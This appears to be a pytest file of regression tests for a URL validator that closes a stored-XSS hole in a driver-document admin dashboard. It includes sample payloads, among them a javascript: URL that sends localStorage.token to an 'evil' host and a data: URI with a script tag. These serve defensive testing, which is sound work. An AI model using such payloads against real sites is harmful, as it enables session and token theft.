"""P1: LinkDocumentRequest.document_url must be a Supabase storage URL only.

An unvalidated str was written verbatim to driver_documents.document_url and
rendered as an <a href> in the admin dashboard. Any authenticated user can
POST /drivers/documents (it auto-creates a driver row), so a javascript: URL
executed on the admin origin with the admin session on click — stored XSS →
admin token theft.
"""

from __future__ import annotations

import os
from unittest.mock import patch

import pytest
from pydantic import ValidationError

_HOST = "https://proj.supabase.co"
_GOOD = f"{_HOST}/storage/v1/object/sign/driver-documents/abc123.pdf?token=x"


def _make(url: str):
    from backend.documents import LinkDocumentRequest

    return LinkDocumentRequest(requirement_id="drivers_license", document_url=url)


@pytest.fixture(autouse=True)
def _supabase_host():
    with patch.dict(os.environ, {"SUPABASE_URL": _HOST}):
        yield


class TestDocumentUrlValidation:
    def test_valid_signed_storage_url_accepted(self):
        assert _make(_GOOD).document_url == _GOOD

    def test_valid_public_storage_url_accepted(self):
        url = f"{_HOST}/storage/v1/object/public/driver-documents/x.png"
        assert _make(url).document_url == url

    def test_javascript_scheme_rejected(self):
        with pytest.raises(ValidationError):
            _make("javascript:fetch('https://evil/'+localStorage.token)")

    def test_data_uri_rejected(self):
        with pytest.raises(ValidationError):
            _make("data:text/html,<script>alert(1)</script>")

    def test_foreign_host_rejected(self):
        with pytest.raises(ValidationError):
            _make("https://evil.com/storage/v1/object/sign/driver-documents/x.pdf")

    def test_wrong_bucket_rejected(self):
        with pytest.raises(ValidationError):
            _make(f"{_HOST}/storage/v1/object/sign/other-bucket/x.pdf")

    def test_non_storage_path_rejected(self):
        with pytest.raises(ValidationError):
            _make(f"{_HOST}/evil/path.pdf")

    def test_http_scheme_rejected(self):
        with pytest.raises(ValidationError):
            _make("http://proj.supabase.co/storage/v1/object/sign/driver-documents/x.pdf")


class TestDevFallbackWithoutSupabaseUrl:
    def test_path_still_enforced_when_host_unknown(self):
        """With SUPABASE_URL unset (dev), the scheme + bucket-path checks still
        block javascript:/data: and arbitrary paths."""
        with patch.dict(os.environ, {"SUPABASE_URL": ""}, clear=False):
            # A well-formed storage path on any https host is tolerated in dev...
            ok = "https://localhost:54321/storage/v1/object/sign/driver-documents/x.pdf"
            assert _make(ok).document_url == ok
            # ...but the XSS vectors are still rejected.
            with pytest.raises(ValidationError):
                _make("javascript:alert(1)")
